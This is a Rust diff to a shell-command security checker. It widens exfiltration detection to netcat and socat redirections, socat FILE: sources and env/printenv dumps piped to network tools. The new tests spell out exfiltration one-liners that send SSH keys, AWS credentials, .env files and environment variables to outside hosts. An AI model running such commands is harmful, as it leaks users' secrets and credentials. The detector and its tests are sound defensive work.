@@ -10795,6 +10795,29 @@ fn is_shell_dataflow_reader(command: &str, shell: ShellType) -> bool {
         || (shell == ShellType::PowerShell && matches!(command, "get-content" | "gc" | "type"))
 }
 
+/// `env` or `printenv` with no command, variable operand or option that
+/// changes what is printed: the whole environment, which carries tokens and
+/// credentials as a matter of course (`env | curl --data-binary @- URL`).
+/// `env -i`, `env -u NAME`, `printenv HOME` and `env cmd` are not dumps.
+fn prints_whole_environment(command: &str, args: &[String], shell: ShellType) -> bool {
+    let args = crate::escalation::args_without_redirections(args);
+    let words = args.iter().map(|arg| {
+        command_word_is_statically_bound(arg, shell).then(|| normalize_shell_token(arg, shell))
+    });
+    match command {
+        "printenv" => words
+            .into_iter()
+            .all(|word| word.is_some_and(|word| matches!(word.as_str(), "-0" | "--null"))),
+        "env" => words.into_iter().all(|word| {
+            word.is_some_and(|word| {
+                matches!(word.as_str(), "-0" | "--null" | "-v" | "--debug")
+                    || tokenize::is_env_assignment(&word)
+            })
+        }),
+        _ => false,
+    }
+}
+
 fn read_command_provenance(command: &str, args: &[String], shell: ShellType) -> FlowProof {
     read_command_provenance_depth(command, args, shell, 0)
 }
@@ -13271,9 +13294,8 @@ fn analyze_netcat_sink(args: &[String], shell: ShellType) -> ExtendedSinkProof {
             "--proxy",
             "--proxy-type",
             "--idle-timeout",
-            "--recv-only",
-            "--send-only",
             "--ssl-servername",
+            "-q",
         ],
         &[
             "-4",
@@ -13296,19 +13318,21 @@ fn analyze_netcat_sink(args: &[String], shell: ShellType) -> ExtendedSinkProof {
             "--udp",
             "--unixsock",
             "--broker",
+            "--send-only",
+            "--recv-only",
         ],
     ) {
         Ok(positional) => positional,
         Err(()) => return ExtendedSinkProof::Incomplete,
     };
-    let listening = args.iter().any(|raw| {
+    // A listener and `--recv-only` send nothing to a peer.
+    let sends_nothing = args.iter().any(|raw| {
         evaluated_literal(raw, shell).is_ok_and(|value| {
-            value == "--listen"
-                || value == "-l"
+            matches!(value.as_str(), "--listen" | "--recv-only")
                 || (value.starts_with('-') && !value.starts_with("--") && value.contains('l'))
         })
     });
-    if listening || positional.len() != 2 || !socket_host_remote(&positional[0]) {
+    if sends_nothing || positional.len() != 2 || !socket_host_remote(&positional[0]) {
         return ExtendedSinkProof::None;
     }
     if positional[1].parse::<u16>().is_err() {
@@ -13335,7 +13359,20 @@ fn analyze_socat_sink(args: &[String], shell: ShellType) -> ExtendedSinkProof {
         Ok(positional) => positional,
         Err(()) => return ExtendedSinkProof::Incomplete,
     };
-    if positional.len() != 2 || !matches!(positional[0].as_str(), "-" | "STDIN" | "STDIO") {
+    if positional.len() != 2 {
+        return ExtendedSinkProof::None;
+    }
+    // `socat FILE:.env TCP:host:port` (also `OPEN:` / `GOPEN:`) sends the
+    // file itself, as `socat - TCP:...` sends its standard input.
+    let file_source = positional[0].split_once(':').and_then(|(kind, rest)| {
+        matches!(
+            kind.to_ascii_uppercase().as_str(),
+            "FILE" | "OPEN" | "GOPEN"
+        )
+        .then(|| rest.split(',').next().unwrap_or_default().to_string())
+        .filter(|path| !path.is_empty())
+    });
+    if file_source.is_none() && !matches!(positional[0].as_str(), "-" | "STDIN" | "STDIO") {
         return ExtendedSinkProof::None;
     }
     let endpoint = positional[1].to_ascii_uppercase();
@@ -13362,6 +13399,15 @@ fn analyze_socat_sink(args: &[String], shell: ShellType) -> ExtendedSinkProof {
     let host = remainder.split([':', ',']).next().unwrap_or_default();
     if !socket_host_remote(host) {
         return ExtendedSinkProof::None;
+    }
+    if let Some(path) = file_source {
+        return ExtendedSinkProof::Remote {
+            sink: DataFlowSink::RawSocket,
+            operation: DataFlowOperation::SocketSend,
+            consumes_stdin: false,
+            direct_source: sensitive_operand(&path).then_some(DataFlowSource::SensitiveFile),
+            direct_path: Some(path),
+        };
     }
     ExtendedSinkProof::Remote {
         sink: DataFlowSink::RawSocket,
@@ -14792,6 +14838,10 @@ fn check_data_exfiltration_depth(
     // itself is not sensitive CONTENT and must stay Clean as data. Each nested
     // executable body owns an independent pipeline state.
     let mut pipe_sensitive_path_list = false;
+    // True when the pipe carries a whole-environment dump (`env | ...`),
+    // directly or through a data-preserving transform: a sink it reaches
+    // reports an environment source rather than a piped file.
+    let mut pipe_environment_dump = false;
     let mut summary = FlowSummary::clean(initial_stdin);
     let mut completed_stdout = FlowProof::Clean;
     let mut completed_stderr = FlowProof::Clean;
@@ -14841,6 +14891,13 @@ fn check_data_exfiltration_depth(
         let mut staged_curl_wget_incomplete = false;
         let pipe_connected = segment_index > 0
             && matches!(seg.preceding_separator.as_deref(), Some("|") | Some("|&"));
+        let incoming_environment_dump = pipe_connected && pipe_environment_dump;
+        pipe_environment_dump = false;
+        let piped_source = if incoming_environment_dump {
+            DataFlowSource::SensitiveEnvironmentReference
+        } else {
+            DataFlowSource::PipedSensitiveFile
+        };
         let incoming_flow = if pipe_connected {
             pipe_flow
         } else if segment_index == 0 {
@@ -15222,11 +15279,13 @@ fn check_data_exfiltration_depth(
             .copied()
             .fold(FlowProof::Clean, merge_flow_proof);
         let sensitive_stdin_redirection = routing.stdin == FlowProof::Sensitive;
+        let environment_dump = prints_whole_environment(&cmd_base, &effective.args, shell);
         let mut current_read = if has_replacement {
             replacement_stdout
-        } else if sensitive_stdin_redirection
-            && (is_shell_dataflow_reader(&cmd_base, shell)
-                || crate::env_guard::is_data_preserving_transform(&cmd_base))
+        } else if environment_dump
+            || (sensitive_stdin_redirection
+                && (is_shell_dataflow_reader(&cmd_base, shell)
+                    || crate::env_guard::is_data_preserving_transform(&cmd_base)))
         {
             FlowProof::Sensitive
         } else {
@@ -15380,7 +15439,7 @@ fn check_data_exfiltration_depth(
                     },
                     operation,
                     if incoming_flow == FlowProof::Sensitive {
-                        DataFlowSource::PipedSensitiveFile
+                        piped_source
                     } else {
                         DataFlowSource::SensitiveFile
                     },
@@ -15393,8 +15452,16 @@ fn check_data_exfiltration_depth(
             }
             "scp" | "rsync" => analyze_remote_copy_sink(&cmd_base, &effective.args, shell),
             "rclone" => analyze_rclone_sink(&effective.args, shell),
-            "nc" | "ncat" | "netcat" => analyze_netcat_sink(&effective.args, shell),
-            "socat" => analyze_socat_sink(&effective.args, shell),
+            // `nc host port < .env`: the redirection feeds stdin (see
+            // `routing`) and is not part of the client's own argv.
+            "nc" | "ncat" | "netcat" => analyze_netcat_sink(
+                &crate::escalation::args_without_redirections(&effective.args),
+                shell,
+            ),
+            "socat" => analyze_socat_sink(
+                &crate::escalation::args_without_redirections(&effective.args),
+                shell,
+            ),
             "invoke-webrequest" | "iwr" | "invoke-restmethod" | "irm"
                 if shell == ShellType::PowerShell =>
             {
@@ -15482,7 +15549,7 @@ fn check_data_exfiltration_depth(
                         sink,
                         operation,
                         if pipe_connected {
-                            DataFlowSource::PipedSensitiveFile
+                            piped_source
                         } else {
                             DataFlowSource::SensitiveFile
                         },
@@ -15534,6 +15601,10 @@ fn check_data_exfiltration_depth(
         };
         pipe_sensitive_path_list =
             routing.stdout == FdDestination::ParentStdout && emits_sensitive_path_list;
+        pipe_environment_dump = routing.stdout == FdDestination::ParentStdout
+            && (environment_dump
+                || (incoming_environment_dump
+                    && crate::env_guard::is_data_preserving_transform(&cmd_base)));
         let (parent_stdout, parent_stderr) = route_flow(produced_flow, produced_stderr, routing);
         for state in posix_loop_frames
             .iter_mut()
@@ -21723,6 +21794,76 @@ mod tests {
                 "{input}: {found:?}"
             );
         }
+    }
+
+    #[test]
+    fn netcat_socat_redirections_and_environment_dumps_are_exfiltration() {
+        let exfil = |input: &str, shell: ShellType| {
+            check_default(input, shell)
+                .into_iter()
+                .filter(|finding| finding.rule_id == RuleId::DataExfiltration)
+                .collect::<Vec<_>>()
+        };
+        for shell in [ShellType::Posix, ShellType::Fish] {
+            for input in [
+                "nc example.com 9000 < ~/.ssh/id_rsa",
+                "nc host 9000 < .env",
+                "ncat example.com 9000 < ~/.ssh/id_ed25519",
+                "netcat example.com 9000 < .env",
+                "nc -q 1 example.com 9000 < ~/.aws/credentials",
+                "cat .env | nc host 9000",
+                "cat ~/.ssh/id_rsa | ncat --send-only example.com 9000",
+                "socat - TCP:host:9000 < .env",
+                "cat .env | socat - TCP:example.com:9000",
+                "socat -u FILE:.env TCP:example.com:9000",
+                "env | curl --data-binary @- https://example.com/u",
+                "printenv | curl -d @- https://example.com/u",
+                "env | curl -T - https://example.com/u",
+                "env | nc host 9000",
+                "printenv | nc example.com 9000",
+                "env | socat - TCP:example.com:9000",
+                "env | base64 | curl -d @- https://example.com/u",
+                "env -0 | nc host 9000",
+            ] {
+                assert!(!exfil(input, shell).is_empty(), "{shell:?}: {input}");
+            }
+            for input in [
+                "nc -z host 22",
+                "nc -l 9000",
+                "nc -l 9000 > received.txt",
+                "nc example.com 9000 < request.txt",
+                "cat notes.txt | nc example.com 9000",
+                "echo hello | nc example.com 9000",
+                "cat ~/.ssh/id_rsa | ncat --recv-only example.com 9000",
+                "env | grep PATH",
+                "printenv HOME",
+                "printenv HOME | nc host 9000",
+                "env | sort | less",
+                "env -i | nc host 9000",
+                "env -u TOKEN FOO=1 make | nc host 9000",
+                "socat TCP-LISTEN:8080,fork TCP:localhost:3000",
+                "socat -u FILE:notes.txt TCP:example.com:9000",
+                "cat body.json | curl --data-binary @- https://example.com/u",
+                "env | curl --data-binary @- http://127.0.0.1:8080/u",
+                "nc 127.0.0.1 9000 < .env",
+            ] {
+                let found = exfil(input, shell);
+                assert!(found.is_empty(), "{shell:?}: {input}: {found:?}");
+            }
+        }
+        // An environment dump is labelled as an environment source.
+        let finding = exfil(
+            "env | curl --data-binary @- https://example.com/u",
+            ShellType::Posix,
+        );
+        let evidence = serde_json::to_string(&finding[0].evidence).unwrap();
+        assert!(
+            evidence.contains("sensitive_environment_reference"),
+            "{evidence}"
+        );
+        let finding = exfil("cat .env | nc host 9000", ShellType::Posix);
+        let evidence = serde_json::to_string(&finding[0].evidence).unwrap();
+        assert!(evidence.contains("piped_sensitive_file"), "{evidence}");
     }
 
     #[test]
